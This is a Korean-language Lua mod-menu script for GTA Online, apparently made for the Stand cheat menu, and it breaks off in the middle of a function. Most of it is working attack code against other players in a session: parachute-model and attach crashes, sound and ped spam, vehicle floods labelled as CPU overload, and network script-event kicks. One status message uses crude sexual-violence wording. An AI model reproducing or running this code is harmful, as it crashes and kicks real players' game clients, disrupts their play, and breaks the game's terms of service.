--   ********   **                           **    ********                **           **  
--  **//////   /**                          /**   **//////                //  ******   /**  
-- /**        ******  ******   *******      /**  /**         *****  ****** **/**///** ******
-- /*********///**/  //////** //**///**  ******  /********* **///**//**//*/**/**  /**///**/ 
--////////**  /**    *******  /**  /** **///**  ////////**/**  //  /** / /**/******   /**  
--       /**  /**   **////**  /**  /**/**  /**         /**/**   ** /**   /**/**///    /**  
--  ********   //** //******** ***  /**//******   ******** //***** /***   /**/**       //** 
-- ////////     //   //////// ///   //  //////   ////////   /////  ///    // //         //  
--Stand Script by Volume
Luaver = 8
local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
f:write("Anti-SkidㅣBy Volume\n\n로더에서 새 파일을 다운로드 받아주세요.\n\n안티 스키드가 조잡하여 , 만약에라도 코드가 유출된다면 경고없이 바로 서비스 종료합니다.")
f:close()
util.require_natives("natives-1660775568-uno")
util.require_natives("natives-1651208000") 
util.toast("Volume`s Script가 성공적으로 로드되었습니다. \n\nVer : V"..Luaver)
util.show_corner_help("~y~Just LuaScript~s~ 가 성공적으로 로드되었습니다.\n이용해주셔서 감사합니다.")
-------------------------------------------------------------------
local function GET_PLAYER_NAME(--[[Player (int)]] player)native_invoker.begin_call();native_invoker.push_arg_int(player);native_invoker.end_call("6D0DE6A7B5DA71F8");return native_invoker.get_return_value_string();end
local PlayerPedCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end
function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end
function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
function a(ped, vehicle, offset, sog) 
    request_model_load(vehicle)
    local front = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, offset, 0.0)
    front.x = front['x']
    front.y = front['y']
    front.z = front['z']
    local veh = entities.create_vehicle(vehicle, front, ENTITY.GET_ENTITY_HEADING(ped))
    if ram_onground then
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(veh)
    end
end
function b(ped, obj, offset, sog) 
    request_model_load(obj)
    local front = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, offset, 0.0)
    front.x = front['x']
    front.y = front['y']
    front.z = front['z']
    local obj = entities.create_object(obj, front, ENTITY.GET_ENTITY_HEADING(ped))
    if ram_onground then
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(obj)
    end
end
function clear()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
        end
    end
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(veh)
        util.yield()
    end
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
    end
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
    end
end
---------------------- 함수 , 변수 지정 끝 
menu.divider(menu.my_root(), "셀프 옵션")
PlayerPT = menu.list(menu.my_root(), "보호 옵션", {}, "", function(); end)
menu.divider(PlayerPT, "엔티티 보호옵션")
menu.action(PlayerPT, "구역 청소하기", {}, "", function()
 clear()
 util.toast(":)")
end)
menu.divider(PlayerPT, "보호 블락옵션")
menu.toggle(PlayerPT, "세션 넷이벤트 차단", {}, ":)", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
    else
        menu.trigger_command(UnblockNetEvents)
    end
end)
menu.toggle(PlayerPT, "세션 싱크 차단", {""}, "비열하시네요 :(", function(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
    end
end)
menu.divider(PlayerPT, "Panic Mode")
menu.toggle(PlayerPT, "보호 모드", {""}, "최강입니다 :)", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)
menu.divider(menu.my_root(), "Credit")
menu.hyperlink(menu.my_root(), "GK", "https://jq.qq.com/?_wv=1027&k=5rzfuV84", "코드 베이스 제공")
menu.action(menu.my_root(), "JinxScript", {}, "여러가지 시스템 구현 , 크래쉬 소스코드 제공", function()
end)
-------------My_Root 끝 , Player_root 시작
function set_up_player_actions(pid)
    menu.divider(menu.player_root(pid), "Volume__- `s Script")
    PlayerAt = menu.list(menu.player_root(pid), "플레이어 공격", {}, "", function(); end)
    PlayerMisc = menu.list(menu.player_root(pid), "플레이어 기타", {}, "", function(); end)
    PlayerAtt = menu.list(PlayerAt, "플레이어 크래쉬 옵션", {}, "", function(); end)
    PlayerAttLob = menu.list(PlayerAt, "플레이어 크래쉬 로비 옵션", {}, "", function(); end)
    Playernotcrash = menu.list(PlayerAtt, "서브옵션", {}, "", function(); end)
    PlayerAttdev = menu.list(PlayerAtt, "개발중인 기능", {}, "", function(); end)
    menu.divider(PlayerAtt, "메인기능")
    PlayerAttPh = menu.list(PlayerAtt, "낙하산 크래쉬", {}, "", function(); end)
    PlayerAttmo = menu.list(PlayerAtt, "Model 크래쉬", {}, "", function(); end)
    PlayerAttpr = menu.list(PlayerAtt, "Prop 크래쉬", {}, "", function(); end)
    PlayerAttev = menu.list(PlayerAtt, "Event 크래쉬", {}, "", function(); end)
    PlayerAttdev1 = menu.list(PlayerAttdev, "작동하지 않는 기능", {}, "", function(); end)
    PlayerAttpad = menu.list(Playernotcrash, "패드도배 옵션", {}, "", function(); end)
    PlayerAttkick = menu.list(PlayerAt, "플레이어 킥 옵션", {}, "", function(); end)
    -------------My_Root 끝 , Player_root 시작
    menu.action(PlayerAttLob,"사운드 크래쉬", {}, "", function()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
			end
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
			end
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Start_Text", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Return_To_Vehicle_Timer", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
                util.yield(5) 
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Return_To_Vehicle_Timer", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end  
            util.yield(10)  
            for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Object_Dropped_Remote", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end         
			util.yield(10)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Object_Dropped_Remote", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end  
		end
        util.toast(":)")
    end)
    menu.action(PlayerAttLob, "낙하산 모델 크래쉬 1", {}, "", function()
        util.toast("낙하산 모델크래쉬1 < 를 전송할게요 :)")
        local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_logpile_06b")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    
            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        util.toast(">> 낙하산 모델 크래쉬 1\n\n모두 끝났어요 :>")
    end)
    menu.action(PlayerAttLob, "낙하산 모델 크래쉬 2", {}, "", function ()
        util.toast("낙하산 모델 크래쉬 2 < 를 전송할게요 :)")
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for i = 1, 20 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(200)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        util.toast(">> 낙하산 모델 크래쉬 2\n\n모두 끝났어요 :>")
    end)
    menu.action(PlayerAttLob, "낙하산 모델 크래쉬 3", {""}, "", function()
        util.toast("낙하산 모델 크래쉬 3 < 를 전송할게요 :)")
        for n = 0 , 5 do
         PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
         object_hash = 1043035044
         STREAMING.REQUEST_MODEL(object_hash)
         while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
         end
         PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
         WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
         util.yield(1000)
         for i = 0 , 20 do
          PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
         end
         util.yield(1000)
         menu.trigger_commands("tplsia")
         bush_hash = 1585741317
         STREAMING.REQUEST_MODEL(bush_hash)
         while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
         end
         PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
         WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
         util.yield(1000)
         for i = 0 , 20 do
          PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
         end
         util.yield(1000)
         menu.trigger_commands("tplsia")
        end
        util.toast(">> 낙하산 모델 크래쉬 3\n\n모두 끝났어요 :>")
    end)
    menu.action(PlayerAttLob, "낙하산 모델 크래쉬 4", {""}, "", function()
        util.toast("낙하산 모델 크래쉬 4 < 를 전송할게요 :)")
        for n = 0 , 5 do
         PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
         object_hash = 3989082015
         STREAMING.REQUEST_MODEL(object_hash)
         while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
         end
         PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
         WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
         util.yield(1000)
         for i = 0 , 20 do
          PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
         end
         util.yield(1000)
         menu.trigger_commands("tplsia")
         bush_hash = -1173932531 ---1705943745
         STREAMING.REQUEST_MODEL(bush_hash)
         while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
         end
         PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
         WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
         util.yield(1000)
         for i = 0 , 20 do
          PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
         end
         util.yield(1000)
         menu.trigger_commands("tplsia")
        end
        util.toast(">> 낙하산 모델 크래쉬 4\n\n모두 끝났어요 :>")
    end)
    ------------로비옵션 끝 , 서브옵션 > 패드스팸 옵션 시작
    menu.action(PlayerAttpad, "마젠타 소환", {}, "", function()
        util.toast("마젠타를 소환해볼게요 :0")
        local playername = PLAYER.GET_PLAYER_NAME(pid)
        crash_in_progress = true
        pedhash = 0x5816C61A 
        local PlayerTable = {}
        local count = 0
        while not STREAMING.HAS_MODEL_LOADED(pedhash) and crash_in_progress do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local FinalRenderedCamRotx = CAM.GET_FINAL_RENDERED_CAM_ROT(0).x
        local FinalRenderedCamRoty = CAM.GET_FINAL_RENDERED_CAM_ROT(0).y
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(0).z
        util.yield(100)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local SpawnedPeds = {}
        for i = 1, 5 do
            local PlayerPedCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
            local coords = PlayerPedCoords
            coords.x = coords.x 
            coords.y = coords.y
            coords.z = coords.z 
            SpawnedPeds[i] = entities.create_ped(28, pedhash, coords, FinalRenderedCamRot)
            ENTITY.FREEZE_ENTITY_POSITION(pedhash,true)
            util.yield(5)                 
        end
    end)
    menu.action(PlayerAttpad, "프랭클린 스팸", {}, "", function()
        util.toast("프랭클린 스팸 < 을 시작해요 :))")
		menu.trigger_commands("anticrashcam on")
		local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		for i = 0 , 30 do 
			invalidpeda1 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 30 do 
			invalidpeda2 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 50 do 
			invalidpeda3 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(5000)
		util.yield(300)
		util.yield(300)
		local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
		util.yield(300)
		menu.trigger_commands("anticrashcam off")
        util.toast(">> 프랭클린 스팸\n\n끝났어요 :3")
	end)
    menu.action(PlayerAttpad, "Wade 스팸", {}, "", function()
        util.toast("Wade 스팸 < 을 시작해요 :3")
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = { }
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
        util.toast(">> Wade 스팸\n\n끝났어요 :8")
    end)
    
    ------------서브옵션 > 패드스팸 옵션 끝 , 서브옵션 시작
    menu.action(Playernotcrash,"CPU 과부화", {}, "", function()
        util.toast("상대방의 CPU를 괴롭힐게요 :)")
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		menu.trigger_commands("anticrashcamera off")
        util.toast(">> CPU 과부화\n\n상대방 CPU를 강간했어요 :)")
	end)
    menu.action(Playernotcrash,"CPU 과부화 2", {}, "", function() 
        util.toast("상대방 CPU를 무자비하게 괴롭힐게요 :)")
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		menu.trigger_commands("anticrashcamera off")
        util.toast(">> CPU 과부화 2\n\n상대방 CPU를 죽여버렸어요 :3")
	end)
    menu.toggle(Playernotcrash, "프레임 낮추기", {""}, "", function(on)
        if on then
            lowfps = true
            lowfpstar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            customexplo = true
            customexplosiontar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            launchloop = true
            launchtar = pid
        else
            lowfps = false
            customexplo = false
            launchloop = false
        end
    end)
    ------------서브옵션끝 , 킥옵션 시작
    menu.action(PlayerAttkick, "넷 이벤트킥", {""}, "", function()
        util.toast("ㅎㅎ")
        util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
        util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
        util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
        util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
    end)
    menu.action(PlayerAttkick, "Invalid 수집품킥", {""}, "", function()
        util.toast("ㅎㅎ")
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
    end)
    menu.action(PlayerAttkick, "Stand 킥 1", {""}, "", function()
        util.toast("ㅎㅎ")
        menu.trigger_commands("kick"..GET_PLAYER_NAME(pid))
    end)
    menu.action(PlayerAttkick, "Stand 킥 2", {""}, "", function()
        util.toast("쉽군")
        menu.trigger_commands("breakup"..GET_PLAYER_NAME(pid))
    end)
    ------------킥옵션 끝 , 크래쉬옵션 시작
    menu.action(PlayerAttdev1, "동물 크래쉬", {}, "개발중, 작동하지않음", function()
        util.toast("동물 크래쉬를 보냈어요 !\n\n아직 개발중인 기능이라 작동하지 않아요 :(")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local coords = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        rab = 0xDFB55C81
        rat = 0xC3B52966
        STREAMING.REQUEST_MODEL(rat)
        local rat = entities.create_ped(1, rat, coords, 90.0)
        WEAPON.GIVE_WEAPON_TO_PED(rat, util.joaat('weapon_rpg'), 9999, true, true)
        STREAMING.REQUEST_MODEL(rab)
        local rab = entities.create_ped(1, rab, coords, 90.0)
        WEAPON.GIVE_WEAPON_TO_PED(rab, util.joaat('weapon_rpg'), 9999, true, true)
    end)
    menu.action(PlayerAttdev1, "낙하산 크래쉬 3", {}, "개발중입니다. 오류가 뜨며 작동하지 않습니다.", function()
        util.toast("개발중입니다. 작동하지 않습니다")
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
        BlockSyncs(pid, function()
            local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            util.yield(50)
            local pos = players.get_position(pid)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos, false, false, false)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            util.yield(50)
            TASK.CLEAR_PED_TASKS(user)
            util.yield(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER._CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos, false, false)
        end)
    end)
    menu.action(PlayerAttdev, "부착 크래쉬", {}, "개발중", function()
        util.toast("부착 크래쉬를 보냈어요 !\n\n아직 개발중인 기능이라 불안정해요 :(")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		a1 = CreateVehicle("1033245328", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a2 = CreateVehicle("276773164", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a3 = CreateVehicle("509498602", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a4 = CreateVehicle("867467158", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a5 = CreateVehicle("861409633", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a6 = CreateVehicle("290013743", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a7 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a8 = CreateVehicle("-50547061", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a9 = CreateVehicle("1394036463", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a10 = CreateVehicle("2025593404", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a11 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a12 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a13 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a14 = CreateVehicle("-1661854193", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        a15 = CreateVehicle(" 2123327359", TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a1, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(a2, TargetPlayerPed, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
